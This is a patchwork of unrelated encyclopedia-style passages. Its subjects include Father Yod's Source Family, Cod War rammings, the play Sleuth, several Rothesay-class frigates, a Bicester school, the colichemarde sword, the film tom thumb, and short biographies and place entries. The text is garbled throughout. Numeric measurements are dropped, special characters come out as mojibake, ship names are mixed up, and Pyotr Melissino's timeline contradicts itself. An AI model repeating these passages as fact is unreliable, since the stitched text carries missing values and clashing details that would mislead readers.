the Hollywood Hills. He as Father Yod and Yahowha had 14 wives and 3 children. His wives were named Makushla, Isis, Astral, Heaven, Prism, Aquariana, Harvest Moon, Galaxy, Lovely, Paralda, Hypatia, Tantalayo, and Venus with Robin (now Ahom) forming the group. His children were Tau, Buttercup and Yod. Music Music was an integral part of the Source Family and many members were musicians. Father Yod formed an improvisational psychedelic rock band called Ya Ho Wha 13, with himself as lead singer. In 1973 the band began making limited pressings of their jam sessions, eventually releasing nine albums that were sold at the Source Restaurant for ten dollars each. The original recordings have become valuable to collectors of underground music.Marc Masters, \\"'70s commune band YaHoWha 13 opens the fold with a Drag City collection\\", Independent Weekly, indyweek.com, 15 July 2009 Celebrities such as Earth, Wind & Fire would buy Source records out of the back of the restaurant. Other family musicians formed various bands including \\"Spirit of 76\\", \\"Savage Sons of Yahowha\\", \\"Yodship\\" and \\"Breath\\". Death On December 26, 1974, the Source Family sold their restaurant and moved to Hawaii. On August 25, 1975, despite having no previous hang gliding experience, Yod decided that he would go hang gliding. Yod used a hang glider to leap off a cliff on the eastern shore of Oahu.Harvey, Doug (2007-08-30). \\"Father Yod Knew Best\\". LA Weekly, August 30, 2007. Retrieved on 2009-06-18 from http://www.laweekly.com/2007-08-30/news/father-yod-knew-best/. He crash-landed on the beach suffering no external injuries, but was unable to move and died nine hours later. The Source Family refers to this day as \\"Black Monday\\". After three days of vigil, Yod was cremated and his ashes put to rest at Lanikai Beach in Hawaii. Legacy left In 2006, two Source Family members, Isis Aquarian and Electricity Aquarian, wrote the history of the religious group. A revised version of the book entitled The Source: The Untold Story of Father Yod, Ya Ho Wa 13 and The Source Family was released in 2007 by Process Media, and included a CD with live Ya Ho Wa 13 performances, radio interviews, and Family recordings.

In January 1958 she joined the Fishery protection Squadron and saw service in the Cod Wars.

Once again, Russell came to assist the trawler and its shipmaster ordered the Icelandic captain to leave the trawler alone as it was not within the limit recognised by the British government. √û√≥rs captain, Eir√≠kur Krist√≥fersson, said that he would not do so, and ordered his men to approach the trawler with the gun manned. In response, Russell threatened to sink the Icelandic boat if it opened fire upon Hackness. More British ships then arrived and Hackness retreated.

The Broadway production received the Tony Award for Best Play, and Anthony Quayle and Keith Baxter received the Drama Desk Award for Outstanding Performance. The play was adapted for feature films in 1972, 2007 and 2014. Plot summary The play is set in the Wiltshire manor house of Andrew Wyke, an immensely successful mystery writer. Wyke's home reflects his obsession with the inventions and deceptions of fiction and his fascination with games and game-playing. He lures his wife's lover Milo Tindle to the house and convinces him to stage a robbery of her jewelry, a proposal that sets off a chain of events that leaves the audience trying to decipher where Wyke's imagination ends and reality begins. Shaffer said the play was partially inspired by one of his friends, composer Stephen Sondheim, whose intense interest in game-playing is mirrored by the character of Wyke, and by John Dickson Carr. Production Paul Rogers and Keith Baxter in the Broadway production of Sleuth (1971) Directed by Clifford Williams, Sleuth opened on 12 January 1970 at the Royal Theatre in Brighton, England. The play eventually transferred to the United States and opened on Broadway on November 12, 1970, at the Music Box Theatre, where it ran for 1,222 performances. Anthony Quayle and Keith Baxter starred as Andrew Wyke and Milo Tindle, with other parts listed as played by Stanley Wright, Sydney Maycock and Liam McNulty. When Quayle left the production in 1972, he was succeeded by Paul Rogers, George Rose and Patrick Macnee. Baxter was succeeded by Brian Murray then Donal Donnelly, Jordan Christopher and Curt Dawson. Accolades Sleuth received the 1971 Tony Award for Best Play, and received nominations for Best Direction of a Play (Clifford Williams) and Best Lighting Design (William Ritman). Anthony Quayle and Keith Baxter received the Drama Desk Award for Outstanding Performance. Sleuth also received the Mystery Writers of America Edgar Award for Best Play. Film adaptations In 1972, Shaffer adapted his play for film, directed by Joseph L. Mankiewicz, starring Laurence Olivier and Michael Caine. Another film adaptation was released in 2007 with a screenplay by Harold Pinter. The 2007 film was directed by Kenneth Branagh, starring Michael Caine and Jude Law as Milo Tindle, originally played by Caine in the 1972 version. The play was also the basis for the film Tamanna. Whilst some of the interactions between the two men are similar, the film has roles for not just Wyke's wife, but also his second, younger wife, the Tindle character's object of desire, and the outcome for the characters is darker. The milieu is Pakistan's film industry, Lollywood in its dying days, and is used an allegory of wider issues. The dialogue, in Urdu, and the scenario are adapted in numerous ways for both Pakistani and Islamic culture.

Bernard compiled a collection of the decrees promulgated by Innocent III during the first ten years of his pontificate (1198‚Äì1208). This work, often called by the scholars of Bologna \\"Compilatio Romana\\", because the author took his documents from the Roman archives, was not of much practical worth, since an official or authentic collection, extending to 1210, rendered Bernard's compilation superfluous.

Design The Rothesay-class was an improved version of the anti-submarine frigate, with nine Rothesays ordered in the 1954‚Äì55 shipbuilding programme for the Royal Navy to supplement the six Whitbys. Rothesay was long overall and between perpendiculars, with a beam of and a draught of . The Rothesays were powered by the same Y-100 machinery used by the Whitby class. Two Babcock & Wilcox water-tube boilers fed steam at and to two sets of geared steam turbines which drove two propeller shafts, fitted with large ( diameter) slow-turning propellers. The machinery was rated at , giving a speed of . Crew was about 212 officers and men. A twin 4.5-inch (113 mm) Mark 6 gun mount was fitted forward, with 350 rounds of ammunition carried. It was originally intended to fit a twin 40 mm L/70 Bofors anti- aircraft mount aft, but in 1957, while Rothesay was still under construction, it was decided to fit the Seacat anti-aircraft missile instead. Seacat was not yet ready, and Rothesay was completed with a twin Mark 5 L/60 40 mm Bofors mount aft as a temporary anti-aircraft armament. The design anti-submarine armament consisted of twelve 21-inch torpedo-tubes (eight fixed and two twin rotating mounts) for Mark 20E Bidder homing anti-submarine torpedoes, backed up by two Limbo anti-submarine mortars fitted aft. The Bidder homing torpedoes proved unsuccessful however, being too slow to catch modern submarines, and the torpedo tubes were soon removed. The ship was fitted with a Type 293Q surface/air search radar on the foremast, with a Type 277 height-finding radar on a short mast forward of the foremast. A Mark 6M fire control system (including a Type 275 radar) for the 4.5 inch guns was mounted above the ship's bridge, while a Type 974 navigation radar was also fitted. The ship's sonar fit consisted of Type 174 search, Type 170 fire control sonar for Limbo and a Type 162 sonar for classifying targets on the sea floor. Rothesay was laid down at Yarrow's Scotstoun dockyard on 6 November 1956, was launched on 9 December 1957 by Audrey Douglas-Hamilton, wide of George Douglas-Hamilton, the First Lord of the Admiralty, and completed on 23 April 1960. Modernisation From 1966 to 1968 Rothesay underwent a major modernisation, which brought the ship close in capacity to the . A hangar and flight deck was added aft to allow a Westland Wasp helicopter to be operated, at the expense of one of the Limbo anti-submarine mortars, while a Seacat launcher and the associated GWS20 director was mounted on the hangar roof. Two 20-mm cannons were added either side of the ship's bridge. A MRS3 fire control system replaced the Mark 6M, and its integral Type 903 radar allowed the Type 277 height finder radar to be removed. A Type 993 surface/air-search radar replaced the existing Type 293Q radar, while the ship's defences were enhanced by the addition of the Corvus chaff rocket dispenser. History In the spring/summer of 1961 Rothesay was in Halifax, Nova Scotia and was intending to make courtesy calls at ports on the eastern seaboard of the United States but was instead diverted to Bermuda, location of the Royal Naval Dockyard that had been reduced to a naval station in 1951 (and headquarters of the America and West Indies Station until 1956, when the position of the Commander-in- Chief was abolished, though the station frigates remained based there), where she was to stay ready to protect British interests in Cuba. On 21 March 1962 she accidentally rammed the Turkish in the western Mediterranean (off Gibraltar) during the NATO exercise \\"Dawn Breeze\\". Between 1962 and 1963 she was commanded by Captain B C Godfrey Place. During two visits to the West Indies (7 months and 11 months) she was at Nassau, Bahamas and filmed for three days to get a 30-second showing in the James Bond film Thunderball. A sheet of canvas with a \\"0\\" was placed over the \\"F1\\" of her pennant number (F107) to read 007. Sean Connery and Claudine Auger came on board. On 14/15 January 1966 Rothesay rescued 134 Haitian refugees, who had been attempting to reach the Bahamas in a long fishing boat but had run aground on an uninhabited island. Between 1966 and 1968 Rothesay was refitted in Rosyth. Among the improvements the 40 mm gun was replaced with Seacat missile system, radar and communication equipment was updated, accommodation improved and perhaps most significantly a helicopter flight deck and hangar were added. Although this required the removal of one of the two triple barrelled anti-submarine mortars, it allowed the Rothesay class to carry the Westland Wasp helicopter which was a huge asset for anti-submarine operations. This modernisation was a vast improvement over the Whitby class and brought the Rothesay class up to the standard of the succeeding .

She attended the 1977 Silver Jubilee Fleet Review with sister ships , and . At this time she was part of the 8th Frigate Squadron.Official Souvenir Programme, 1977. Silver Jubilee Fleet Review, HMSO At the start of the Falklands War, Rothesay was in Rosyth under repair after she hit a sea wall in Esbjerg, Denmark. During the 1982 conflict, Rothesay was stationed in the Caribbean. There were plans to withdraw the ship from service in 1983 but these were abandoned and instead in 1985 she underwent a refit in preparation for her new role in the Dartmouth Training Squadron. She served in this role until she was paid off on 13 March 1988. During her many years of service she clocked up over 800,000 miles. She was sold to Spain and was broken up at Santander in 1988.

At Portsmouth Navy Days, August 1980 In November 1975 she entered the Rosyth Dockyard to be refitted as a trials ship for Admiralty Surface Weapons Establishment. Up to October 1979 Londonderry had her armament removed, and an extra mast added for her new role as a trials ship. The original propellers were replaced and new, low-cavitation propellers were installed. Additional navigational equipment and accommodation were installed to provide berths for both midshipmen from Dartmouth and apprentices from HMS Caledonia who were undergoing sea training. In early 1982, Londonderry accompanied Fearless on a sea training trip to the West Indies and the United States of America, visiting Virgin Gorda in the British Virgin Islands and New Orleans during the Mardi Gras celebrations. Returning home she was paid off into reserve on 31 March 1982. Originally she should have been put on the disposal list, but due to the Falklands War she became the Dartmouth Training Ship of the 6th Frigate Squadron. From 20 January to 29 March Londonderry made her last cruise from Portsmouth for the Dartmouth Training Squadron's deployment to the West Indies and USA. She then became a Harbour Training Ship attached to the shore base HMS Sultan at Gosport. She remained in this role until 1988. On 25 June 1989 Londonderry was finally sunk as a target off Scotland. During her service Londonderry steamed approximately 125,500 km, four times crossing the Atlantic and transiting the Panama Canal three times. She visited 50 ports in 35 different countries. Although never deployed in a war the ship's guns fired 1,232 rounds of 4.5-inch ammunition and 442 rounds of 40 mm ammunition.

Construction and career Falmouth was laid down on 23 November 1957 by Swan Hunter & Wigham Richardson, launched on 15 December 1959 and was completed on 25 July 1961. In August 1961 Falmouth joined the 20th Frigate Squadron based at Londonderry Port, Northern Ireland. On 5 December that year, Falmouth collided with the oiler in Lyme Bay and was badly damaged. From December 1963, Falmouth served as leader of the 30th Frigate Squadron.

From August 1968 to 6 January 1971, Falmouth was refitted at Portsmouth Dockyard, being fitted with a hangar and flight deck to allow operation of a single Westland Wasp helicopter, while a Seacat launcher was fitted on top of the hangar. One of the Limbo mortars and the Bofors guns were removed in compensation. On the evening of 6 May 1976, after the outcome of the Third Cod War had already been decided, the Icelandic gunboat V/s T√Ωr was trying to cut the nets of the fishing trawler Carlisle, when Captain Gerald Plumer of Falmouth ordered it rammed. Falmouth rammed the T√Ωr at the speed of 22+ knots (41+ km/h), almost capsizing her. T√Ωr did not sink and managed to cut the nets of Carlisle, after which the Falmouth rammed it again. The T√Ωr was heavily damaged and found herself propelled by only a single screw and pursued by the tug-boat Statesman.

Falmouth also sustained serious structural damage on her bow during the incident, and had to enter dry dock at Portsmouth for repairs. In January 1977, when the United Kingdom enlarged its Exclusive economic zone to , Falmouth was deployed in the North Sea, protecting fishing stocks and oil fields. Falmouth left active service in 1980, when she was transferred to the Standby Squadron at Chatham, and by early 1982 she was being considered for disposal as a result of the 1981 Defence White Paper, which proposed cuts in the Royal Navy's surface fleet. Argentina's invasion of the Falkland Islands in April 1982 changed these plans, and Falmouth was given a refit and returned to active duty, although she did not take part in the Falklands War.

In April 1982, Rhyl was ordered south for operational duties with the task force in Operation Corporate, but mechanical failure prevented the deployment. She subsequently took her place as part of Operation Corporate acting as Ascension Island guardship until July 1982. HMS Rhyl deployed to the United States and West Indies in the first few months of 1983. Returning to Portsmouth in April 1983 she was expected to take her place in the Orient Express deployment led by HMS Invincible later that year. However whilst in dry dock it was discovered that her hull was compromised and the decision was made to pay her off.

Lowestoft was reconstructed in the late 1960s to largely the same pattern as the third group of Leander frigates, with new radar and fire control and a hangar and pad for a Wasp helicopter for longer range, anti submarine, engagement. In the late 1970s it was converted as the prototype towed array frigate for the Royal Navy, but retained its full armament. Lowestoft was sunk as a target on 8 June 1986 by using a Tigerfish torpedo. She was the last Royal Naval target to be sunk still displaying her pennant number. Design The Rothesay-class was an improved version of the Whitby-class anti-submarine frigate, with nine Rothesays ordered in the 1954‚Äì55 shipbuilding programme for the Royal Navy to supplement the six Whitbys. Lowestoft was long overall and between perpendiculars, with a beam of and a draught of . The Rothesays were powered by the same Y-100 machinery used by the Whitby-class. Two Babcock & Wilcox water-tube boilers fed steam at and to two sets of geared steam turbines which drove two propeller shafts, fitted with large ( diameter) slow-turning propellers. The machinery was rated at , giving a speed of . Crew was about 212 officers and men. A twin 4.5-inch (113 mm) Mark 6 gun mount was fitted forward, with 350 rounds of ammunition carried. It was originally intended to fit a twin 40 mm L/70 Bofors anti- aircraft mount aft, but in 1957 it was decided to fit the Seacat anti-aircraft missile instead. Seacat was not yet ready, and Yarmouth was completed with a single L/60 40 mm Bofors mount aft as a temporary anti-aircraft armament. The design anti-submarine armament consisted of twelve 21-inch torpedo-tubes (eight fixed and two twin rotating mounts) for Mark 20E Bidder homing anti- submarine torpedoes, backed up by two Limbo anti-submarine mortars fitted aft. The Bidder homing torpedoes proved unsuccessful however, being too slow to catch modern submarines, and the torpedo tubes were soon removed. The ship was fitted with a Type 293Q surface/air search radar on the foremast, with a Type 277 height-finding radar on a short mast forward of the foremast. A Mark 6M fire control system (including a Type 275 radar) for the 4.5 inch guns was mounted above the ship's bridge, while a Type 974 navigation radar was also fitted. The ship's sonar fit consisted of Type 174 search, Type 170 fire control sonar for Limbo and a Type 162 sonar for classifying targets on the sea floor. Lowestoft was laid down at Alexander Stephen and Sons's Linthouse, Glasgow shipyard on 19 June 1958, was launched on 23 June 1960 and completed on 26 September 1961. Modernisation From 1967 to 1969 Lowestoft underwent a major modernisation, which brought the ship close in capacity to the Leander-class. A hangar and flight deck was added aft to allow a Westland Wasp helicopter to be operated, at the expense of one of the Limbo anti- submarine mortars, while a Seacat launcher and the associated GWS20 director was mounted on the hangar roof. Two 20-mm cannons were added either side of the ship's bridge. A MRS3 fire control system replaced the Mark 6M, and its integral Type 903 radar allowed the Type 277 height finder radar to be removed. A Type 993 surface/air-search radar replaced the existing Type 293Q radar, while the ship's defences were enhanced by the addition of the Corvus chaff rocket dispenser. Service Lowestoft commissioned on 18 October 1961 and joined the 5th Frigate Squadron in March 1962. Between 1961 and 1963 she was commanded by Raymond Lygo. In January 1971, Lowestoft joined STANAVFORLANT, the NATO Standing Naval Force Atlantic. From October 1976 to September 1977, Lowestoft was refitted at Portsmouth for her new role as a trials ship for towed array sonar arrays. She was again refitted, at Falmouth in October 1978. In June 1982, as a result of the Falklands War, she was returned to operational service with the 7th Frigate Squadron after a short refit at Portsmouth, serving as guardship at Ascension Island. Lowestoft was paid off at Portsmouth on 29 March 1985, and was placed on the Disposal list. Lowestoft was sunk as a target off the Bahamas on 8 June 1986.

It is situated in Bicester, Oxfordshire, England, and occupies a site leading off Queens Avenue. The school's sports facilities are used by Bicester Athletic Club, which has been awarded National Lottery funding to add allweather surfaces to the sports field's jumping and throwing event areas. History The Bicester School was formed as a new comprehensive school in 1966. It was created by the merger of Highfield Secondary Modern School and Bicester Grammar School, who had shared the current site since 1963. Bicester Grammar School had previously been situated at the junction of London Road and Launton Road. The school has been a Government-designated specialist Technology College since 1998. In May 2011 Bicester Community College received the Most Improved Award from the Specialist Schools and Academies Trust (SSAT) for improving its GCSE results by 20 percentage points from 2007‚Äì2010. The college received congratulations for significantly improving its 5+ A*‚ÄìC results including GCSE English and Mathematics. At the previous inspection in October 2010 the 963-pupil school was deemed satisfactory. The latest Ofsted inspection that took place on 6 and 7 December in 2012 has revealed that Bicester Community College, overall, falls under the inadequate category. Inadequate is the lowest of all four tiers ranked by Ofsted, with the other tiers being \\"Requires improvement\\" ( previously \\"Satisfactory\\"), \\"Good\\" and \\"Outstanding.\\" Achievement of pupils, quality of teaching, behaviour and safety of pupils and leadership and management were deemed level four on the scale of one to four, with four being the worst category (inadequate). Principal Jason Clarke has responded to the report, stating that \\"[the school is] very disappointed by the outcome of the inspection and the impact it may have on hard work undertaken since the last inspection two years ago. The report acknowledges the recent positive impact of many initiatives currently in place and under way. My greatest disappointment is the grade for behaviour, which does not truly reflect the positive attitude and pride the vast majority of our students have for their school.\\" The school was put in special measures in February 2013. Oxfordshire county council subsequently asked the Department for Education for permission to remove the board of governors, with the request being granted on Thursday 21 February 2013. A new five person interim executive board (IEB) was put in place to oversee the school.http://www.bicesteradvertiser.net/news/10241101.Head_apologises_as_council_sacks_Bicester_college_governors/ On Monday 18 March 2013 the Principal Jason Clarke left the school by mutual agreement with the IEB.

In 2006 Bicester achieved membership of the Most Improved Specialist Schools Club after the number of pupils getting five or more A*‚ÄìC grades at GCSE rose from 40 per cent in 2002 to 50 per cent in 2005. The results dropped in 2006 with only 36 per cent achieving the benchmark five or more GCSE passes at A*‚ÄìC, but the 2007 results were a significant improvement with 52 per cent gaining five or more GCSE passes at the appropriate grades. There have been successful Oxbridge applications from the school in the last ten years, and the school has sent students to other top UK universities, including King's College London, the London School of Economics and Political Science, University College London, the University of Warwick, the University of Bristol and the University of Nottingham. The University of Reading, Coventry University, the University of Southampton, Oxford Brookes University and Nottingham Trent University are also popular destinations for former students of the school. Performing arts In 2008 the college was awarded the Artsmark Gold Award in recognition of its achievements in the arts. Bicester Community College has a performing arts department, with a jazz band, choirs, wind band, string orchestra, chamber ensembles, a boys' dance company and dance clubs.

The abrupt narrowing of the blade, the defining feature of the colichemarde, is visible. Vevey historical museum. Colichemarde is a type of small sword (often written \\"smallsword\\") blade that was popular from the late 17th century to the middle 18th century. Overview The small sword is considered to be a descendant of the \\"transitional rapier\\", which itself evolved from the rapier due to the demand for a lighter sword, easier to wear. The shape of a colichemarde blade features a wide forte, which abruptly tapers to a much narrower form at a point varying between a fifth to a third of the blade length from the hilt. The blade cross section was most often triangular and hollow-ground. This configuration combines good parrying characteristics, due to the wide blade forte, with the good maneuverability and thrusting characteristics imparted by the narrow blade foible. Its lighter weight, shorter length and superior balance, compared to the rapier, allowed faster and more accurate movement of the blade. This enabled the fencer to achieve a more precisely targeted thrust on an adversary.Burton, R.F. (1884 - reprinted 2009) The Book of the Sword, Cosimo Classics, New York. p. 135 The point where the blade of a sword joins the tang was a recognized weak point. The tang was often made of malleable iron and forge-welded to the steel of the blade. A wider blade at this point of transition, such as is seen in the colichemarde, may have been viewed as offering a stronger union. Brief history Two views of the same weapon. The colichemarde blade configuration is sometimes credited to one Graf von K√∂nigsmark (perhaps Otto Wilhelm K√∂nigsmarck), owing to the two names' similarity in pronunciation. Refers to a \\"Swedish soldier of fortune who rose to become Marshal of France,\\" which is either utterly fantastic or a confused reference to Maurice de Saxe. Names Otto Wilhelm K√∂nigsmarck specifically. The colichemarde first appeared about 1680 and was popular during the next 40 years at the royal European courts. It was especially popular with the officers of the French and Indian War period. George Washington was presented with one during his inauguration. The widespread misapprehension that the colichemarde quickly ceased to be produced after 1720 dates to the opinion given by Sir Richard Burton in his Book of the Sword (1884).Burton, R.F. (1884 - reprinted 2009) The Book of the Sword, Cosimo Classics, New York. p. 135 However, many securely dated colichemarde swords from as late as the 1770s can be found in collections.Peterson, H.L. (1965) The American Sword 1775-1945, Ray Riling Arms Books, Philadelphia. pp. 300, 303 This sword appeared at about the same time as the foil. However the foil was created for practicing fencing at court, while the colichemarde was created for dueling. It made frequent appearances in the duels of New Orleans. The modern √©p√©e is descended from the colichemarde.

The film, based on the fairy tale \\"Thumbling\\" by the Brothers Grimm, is about a tiny man who manages to outwit two thieves determined to make a fortune from him. It stars Russ Tamblyn in the title role, with a largely British supporting cast (it was filmed in both Hollywood and London), including Bernard Miles and Jessie Matthews as Tom Thumb's adoptive parents, June Thorburn as the Forest Queen and comic actors Terry-Thomas and Peter Sellers as the villainous duo who try to exploit the tiny hero for profit. Director Pal worked with cinematographer Georges P√©rinal, animators Wah Chang and Gene Warren, art director Elliot Scott and special effects artist Tom Howard to create the animated and fantasy sequences. Peggy Lee wrote the songs, and Douglas Gamley and Ken Jones wrote the music. The film is referenced in The Wonderful World of the Brothers Grimm (1962) and Pinkeltje (1978). The film is also featured in That's Dancing! (1985) The filming locations for the movie were in Hollywood, Los Angeles, California, U.S. and London, England. Plot Jonathan, a poor but honest lumberjack, lives in the forest with his loving wife Anne. One day, while chopping down a tree, the mystical Forest Queen appears before Jonathan and begs him to spare the tree as it is a home to a family of birds. As selling wood is his livelihood, Jonathan is initially reluctant, but after the Queen demonstrates her magic powers, Jonathan agrees. In gratitude, the Queen tells Jonathan she will grant Jonathan and his wife three wishes. Jonathan races home to tell Anne about the incredible encounter. Unfortunately, Jonathan and Anne accidentally squander the wishes while bickering over dinner. As they turn in for bed that night, they look over the second bedroom of their cottage, which is fully stocked with toys for the child that they dearly wanted but were never able to have. Anne laments their previous squandering of their magic wishes, which they could have used to wish for a child, but Jonathan consoles her that the Forest Queen may yet show them kindness and grant them one more wish. Anne remarks that she would love any child that they would have had \\"even if he was no bigger than her thumb.\\" Later, they are roused by a soft knocking at the door and find before them a young boy who is literally the size of a thumb, who addresses Jonathan and Anne familiarly as \\"Father\\" and \\"Mother\\". Anne instinctively knows that the little boy's name is Tom. In the following days, best family friend Woody takes Tom into town where a carnival is being held. Tom is carried off by a balloon up to the top of the nearby castle's treasury tower, where two thieves, Ivan and Antony, are conspiring to steal the gold. They realize that due to his size, Tom will easily be able to slip between the bars of the grill on the treasury roof and trick him into believing that they need the gold to help poor orphans. As a reward for his assistance, Ivan gives Tom a single gold sovereign from the stolen loot. Tom returns home late at night, to find his parents distraught over his disappearance from the carnival. While he sneaks in through the window, he accidentally drops his sovereign into a cake that his mother had been baking. By the next morning, the robbery has been discovered and guards are scouring the countryside searching for the thieves. A unit stops at Jonathan's cottage to ask if he or Anne have seen anyone suspicious in the area. Anne offers the guards some cake and one guard bites into the slice containing the sovereign, instantly recognizing it as part of the stolen treasure. Jonathan and Anne are wrongly accused of theft, arrested and taken away to be flogged in the town square. With his best friend Woody's help, Tom tracks down the real thieves and, thanks to his ability to control animals, especially donkeys and horses, eventually manages to bring them back to the town square, along with their loot, thereby exonerating his parents. Ivan and Antony are arrested and the gold is returned to the treasury. The movie concludes with Woody marrying the already former Forest Queen, whom he has been clumsily romancing throughout the movie.

Music Cypher have been variously classified as Post-rock, Space rock, Noise and Shoegaze. Although their music can contain elements of any of these categories, they don't fall into any specific one. Their sound is often characterised by multiple delay effects on the guitar, causing a 'wall of sound'. The guitar and bass riffs are often repeated at great length, ebbing and flowing in volume and intensity. The songs can be quite long, sometimes exceeding 15 minutes in length. Live, the band often performs at loud volumes. Band history Formed in 1998 as a five piece, the original line-up included Mark Cossom (guitar) and Rob Agostini (vocals). This line-up played several performances and recorded a single in 1998 before Cossom and Agostini left the band amicably. Their departure caused the style of the music to become focused around longer songs with fewer sections, which gradually built up from quiet beginnings into overpowering crescendos and back down again. The band (now a three piece) released their debut album What's a World Without Laughter in September 1999 on the Toronto based Aporia Records label. Some songs on the album utilised keyboards, so in order to perform the songs live, the band recruited Karli Rob on keyboards. An album of remixes and some new material was released in 2000. The band performed a small number of performances before Rob left and was replaced on keyboards by Ian Roberston. More performances followed, included a slot on RTRFM's annual fund raiser 'In the Pines' during which the band were noted for their use of a whipper snipper as an instrument and cooking pancakes onstage for the crowd during their set. From the end of 2003, the band experienced a hiatus until re-emerging as the current three piece line-up at the end of 2005. An album of previously recorded material Life Changing Sunnies was released in September 2006. After another period of inactivity, late in 2012 the band played a series of live performances and recorded a new album One Thousand Birds which was released in October 2013.

Taussig was a 1928 graduate of the Music Academy in Vienna, where he studied composition with Franz Schmidt and conducting with Robert Heger. The political climate of Europe in the late 1930s caused Taussig to emigrate to the United States (along with his mother and sister, the acclaimed mathematician Herta Freitag), by way of Havana (where he conducted the Havana Philharmonic). The conductor worked at the Chicago Opera, the Montreal Opera and San Francisco Opera before being hired by the Met as its assistant chorus master. He established himself as a coach, especially in German repertoire, serving as mentor to several generations of Met singers, from Birgit Nilsson, who called him \\"the father\\" of her Elektra, to Pl√°cido Domingo, who coached the role of Parsifal with him, and Deborah Voigt. His principal conducting credits with the Met numbered fewer than a dozen performances - among them La Traviata on the company's 1975 tour of Japan - but in Der Rosenkavalier and in other operas, Taussig was a frequent leader of the Met's offstage instrumentalists, nicknamed \\"The Taussig Philharmonic\\" by James Levine.

Early life He was born as Petros Melissinos in 1726, on the Greek island of Cephalonia, which was then under Venetian rule. His father was a physician who descended from a branch of the noble Eastern Roman family of Melissenos that had left Crete in the 15th century and settled on Cephalonia. Throughout his life, he prided himself on his origin. He received a thorough education in his youth and was fluent in many languages including Russian, German, Italian, French, Turkish as well as his native Greek, he also knew some Latin and English.  Career  Melissinos arrived in Russia during the reign of Peter the Great and ended his career as Vice-President of the Commerce Collegium in 1740-45. During the Russo-Turkish War, 1768-1774, Pyotr Melissino was in charge of the Russian artillery. His efficient command helped Russian forces prevail against a fourfold numerical superiority of the Ottomans at Khotin, Larga, and Kagula. In 1783, he was appointed Director of the Artillery and Engineering Corps in St. Petersburg. He is remembered as an organizer of the artillery education in the Russian Empire. After the ascension of Emperor Paul, Melissino was put in charge of the entire Russian artillery but died the following year. Melissino was instrumental in promoting the career of one of Paul's favourites, Aleksey Arakcheyev. His son Aleksey Melissino, a Major General, was killed in the Battle of Dresden (1813).

Before moving to its present location in 1932, it was located at Tokai, Cape Town. Built on a rise between the Outeniqua Mountains and the Indian Ocean, the college commands sweeping views of fynbos-covered mountains and indigenous high forest. Between 1932 and 1985, it trained about 1300 foresters who were subsequently employed by the State and private companies such as Mondi and Sappi. History Ox-wagon crossing the Kaaimans River in late 19th century During the 19th-century development in the Cape Colony led to an increased demand for structural and furniture timber. This led to an unhealthy strain on the indigenous forests of the Southern Cape, which had been exploited since the days of Jan van Riebeeck. Farsighted planning obviously called for the establishment of plantations of fast-growing exotic trees and the necessary trained foresters to manage them. To meet this need, the South African College Schools (SACS) started a course for forest rangers in 1902, but was superseded by the Tokai School for Forest Apprentices in 1912. At that stage forestry fell under the Department of Agriculture and was more conservation-oriented than concerned with afforestation; consequently the output of foresters was very small at that time. With the rapid growth of the timber industry, it was decided to relocate Saasveld to its present position on the farm Pampoenkraal, due to its proximity to indigenous forest, open areas suitable for plantations of exotics, sawmills in the vicinity and drying kilns in George. Many explorers, naturalists and botanists such as Thunberg, Sparrman, Le Vaillant, Dr√®ge, Ecklon and Zeyher had visited the farm in the preceding two centuries. In 1854 the farm was subdivided and the portion on which the college would eventually be built, was bought by the baroness Gesina van Rede van Oudtshoorn, and named Saasveld after her ancestral castle in Overijssel in the Netherlands. In 1867 Thomas Bain, the famous road-maker, had surveyed the main road heading east to Knysna and passing through Pampoenkraal. In those days a toll gate was sited near the present entrance to Saasveld. In 1917 Saasveld was bought by the George Forest Timber Co., and later acquired by Searles Limited. In 1928 ownership of the land finally passed to the State and work started on construction of the College. Recent history right The PE Technikon expanded to the Southern Cape in 1985 when it took over the Saasveld Forestry College from the Department of Forestry. Nelson Mandela University (NMU), situated in Nelson Mandela Bay, opened on 1 January 2005, the result of a merger of the PE Technikon, the University of Port Elizabeth and the Port Elizabeth campus of Vista University. Saasveld is now a satellite campus of NMU.  See also  * Joseph Storr Lister * List of historic schools of forestry References * Saasveld 50 Barnard, Cameron et al.

In 1839, it was the largest city in the county with a population of 3,006. Today Balk√°ny is home to 6,852 people (2005) most of whom live in the country. Unemployment is a serious problem: there are more jobs being lost than created. Like in the past, the biggest sector of employment is agriculture. However, the lack of investment and decreasing prices of locally produced goods have created an unfriendly business environment. There are a number of kindergartens and two elementary as well as middle schools educating the town's 1,300 children.

GMA Canada recognized the efforts of George Beverly Shea who was born in Winchester, Ontario February 1, 1909. His long association with the Billy Graham Crusades and his more than 70 albums led to his being referred to as \\"America's Beloved Gospel Singer\\". According to the Guinness Book of Records Shea holds the world record for singing in person to the most people ever, with an estimated cumulative live audience of 220 million people. In 1932 Shea composed the tune to \\"I'd Rather Have Jesus,\\" with words written by Rhea F. Miller (1894‚Äì1966). Shea was unable to attend the GMA Canada Covenant Awards ceremony in person, but sent his thanks via video link. 2005 - Tommy Hunter was recognized by GMA Canada in 2005. Hunter was born in London, Ontario, March 20, 1937. \\"The Tommy Hunter Show\\" began as a CBC radio program in 1960 and went on to replace Country Hoedown on CBC television in 1965; Hunter's show was picked up by TNN in 1983 and ran on CBC Television until 1992. One of the regular features of the program included Hunter's inspirational and Gospel songs at the close of each show. He also released two Gospel albums \\"Songs Of Inspiration\\" and \\"Readings\\" which featured the fan favourites \\"Touch Of The Master's Hand\\" and \\"No Charge\\". Tommy Hunter was inducted into the Canadian Country Music Hall of Fame in 1984. In 1986, Hunter was made a Member of the Order of Canada. He has received three Canadian Juno Awards and one Gemini Award. In 1990, he was given a place in the Country Music Hall of Fame's \\"Walkway of Stars\\". A street (\\"Tommy Hunter Way\\") was also renamed in his honour in his hometown of London, Ontario, in the late 1990s. He became a member of the Order of Ontario in 1996 2006 - Connie Scott was recognized by GMA Canada in 2006. Scott grew up around Gospel Music. Her father, Gerry Scott was both an early radio show host playing Gospel Music and the owner of Canada's largest distributor of Christian Music at the time, Word Records Canada.

